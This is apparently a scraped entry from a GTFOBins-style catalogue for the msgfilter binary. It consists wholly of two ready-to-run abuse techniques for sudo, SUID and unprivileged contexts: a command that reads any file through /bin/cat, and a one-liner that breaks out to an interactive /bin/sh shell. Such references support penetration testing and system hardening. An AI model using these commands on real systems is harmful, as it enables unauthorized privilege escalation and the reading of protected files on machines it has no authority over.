title: msgfilter
html:
msgfilter

File Read

Context: sudo, suid, unprivileged

msgfilter -P -i /path/to/input-file /bin/cat

Shell

Context: sudo, suid, unprivileged

echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
excerpt: msgfilter File Read Context: sudo, suid, unprivileged msgfilter -P -i /path/to/input-file /bin/cat Shell Context: sudo, suid, unprivileged echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1&
